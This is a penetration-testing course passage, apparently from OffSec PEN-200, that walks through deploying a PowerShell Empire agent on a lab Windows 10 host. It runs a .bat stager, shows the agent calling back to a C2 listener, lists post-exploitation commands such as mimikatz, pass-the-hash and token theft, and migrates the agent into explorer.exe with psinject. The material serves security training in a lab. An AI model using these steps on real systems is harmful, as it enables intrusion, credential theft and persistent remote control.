Now that we have our listener running and our stager prepared, we will need to deploy an agent on the victim. An agent is simply the final payload retrieved by the stager, and it allows us to execute commands and interact with the system. The stager (in this case the .bat file) deletes itself and exits once it finishes execution.

Once the agent is operational on the target, it will set up an AES-encrypted communication channel with the listener using the data portion of the HTTP GET and POST requests.

We will first copy the launcher.bat script to the Windows 10 workstation and execute it from a command prompt.

![Figure 1: Execution of launcher](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/pse/2d915cc1932f72dfdd09d0d38c204d42-pse01.png)

Figure 1: Execution of launcher

After successful execution of the launcher script, an initial agent call will appear in our Empire session as shown in Listing 11:

```
(Empire: stager/windows/launcher_bat) > [+] Initial agent S2Y5XW1L from 10.11.0.22 now active (Slack)
```

Next, we can use the agents command to display all active agents.

```
(Empire: stager/windows/launcher_bat) > agents

[*] Active agents:

Name       Lang  Internal IP  Machine Name  Username     Process             Delay
---------  ----  -----------  ------------  ---------    -------             -----
S2Y5XW1L   ps    10.11.0.22   CLIENT251     corp\offsec  powershell/2976     5/0.0

(Empire: agents) > 
```

Now, we can use the interact command followed by the agent name to interact with our agent and execute commands.

In this case, we will run sysinfo to retrieve information about the compromised host.

```
(Empire: agents) > interact S2Y5XW1L

(Empire: S2Y5XW1L) > sysinfo

(Empire: S2Y5XW1L) > sysinfo: 0|http://10.11.0.4:80|corp|offsec|CLIENT251|10.11.0.22|Microsoft Windows 10 Pro|False|powershell|2976|powershell|5

Listener:         http://10.11.0.4:80
Internal IP:    10.11.0.22
Username:         corp\offsec
Hostname:       CLIENT251
OS:               Microsoft Windows 10 Pro
High Integrity:   0
Process Name:     powershell
Process ID:       2976
Language:         powershell
Language Version: 5
...
```

Note that the command does not return immediately. This delay is caused by the _DefaultDelay_ parameter, which is currently set to the default value of five seconds.

The help command (Listing 14) shows all available commands, such as upload, download, and screenshot, which are self-explanatory. In addition, we can use shell to execute a command and spawn to create an additional agent on the same host.

```
(Empire: S2Y5XW1L) > help

Agent Commands
==============
agents            Jump to the agents menu.
back              Go back a menu.
bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. 
clear             Clear out agent tasking.
creds             Display/return credentials from the database.
download          Task an agent to download a file.
exit              Task agent to exit.
help              Displays the help menu or syntax for particular commands.
info              Display information about this agent
injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode
jobs              Return jobs or kill a running job.
kill              Task an agent to kill a particular process name or ID.
killdate          Get or set an agent's killdate (01/01/2016).
list              Lists all active agents (or listeners).
listeners         Jump to the listeners menu.
lostlimit         Task an agent to change the limit on lost agent detection
main              Go back to the main menu.
mimikatz          Runs Invoke-Mimikatz on the client.
psinject          Inject a launcher into a remote process. Ex. psinject <listener> <pi
pth               Executes PTH for a CredID through Mimikatz.
rename            Rename the agent.
resource          Read and execute a list of Empire commands from a file.
revtoself         Uses credentials/tokens to revert token privileges.
sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG.
scriptcmd         Execute a function in the currently imported PowerShell script.
scriptimport      Imports a PowerShell script and keeps it in memory in the agent.
searchmodule      Search Empire module names/descriptions.
shell             Task an agent to use a shell command.
sleep             Task an agent to 'sleep interval [jitter]'
spawn             Spawns a new Empire agent for the given listener name. Ex. spawn <li
steal_token       Uses credentials/tokens to impersonate a token for a given process I
sysinfo           Task an agent to get system information.
updateprofile     Update an agent connection profile.
upload            Task an agent to upload a file.
usemodule         Use an Empire PowerShell module.
workinghours      Get or set an agent's working hours (9:00-17:00).

(Empire: S2Y5XW1L) > 
```

As with a meterpreter payload, Empire allows us to migrate our payload into a different process. We can do that by first using ps to view all running processes. Once we choose our target process, we'll migrate the payload with psinject command, including the name of the listener and the process id as our command arguments:

```
(Empire: S2Y5XW1L) > ps
ProcessName            PID Arch UserName    MemUsage 
-----------            --- ---- --------    -------- 
Idle                     0 x86  N/A         0.00 MB  
System                   4 x86  N/A         0.00 MB  
........
explorer              3568 x86  corp\offsec 3.41 MB  
svchost               3820 x86  corp\offsec 9.18 MB  
........

(Empire: S2Y5XW1L) > psinject http 3568
[*] Tasked U9M3SBHG to run TASK_CMD_JOB
[*] Agent U9M3SBHG tasked with task ID 4
[*] Tasked agent U9M3SBHG to run module powershell/management/psinject
Job started: BCMWAV
[*] Agent U9M3SBHG returned results
[*] Sending POWERSHELL stager (stage 1) to 10.11.0.22
[*] New agent DWZ49BAP checked in
[+] Initial agent DWZ49BAP from 10.11.0.22 now active (Slack)
[*] Sending agent (stage 2) to DWZ49BAP at 10.11.0.22 //-->
(Empire: S2Y5XW1L) > 
```

It is important to note that, unlike the migration feature of the meterpreter payload, once the process migration is completed, the original Empire agent remains active and we must manually switch to the newly created agent as shown below:

```
(Empire: DWZ49BAP) > agents

[*] Active agents:

Name       Lang  Internal IP  Machine Name  Username     Process             Delay
---------  ----  -----------  ------------  ---------    -------             -----
S2Y5XW1L   ps    10.11.0.22   CLIENT251     corp\offsec  powershell/2976     5/0.0
DWZ49BAP   ps    10.11.0.22   CLIENT251     corp\offsec  explorer/3568       5/0.0
 
(Empire: agents) > interact DWZ49BAP
(Empire: DWZ49BAP) > 
```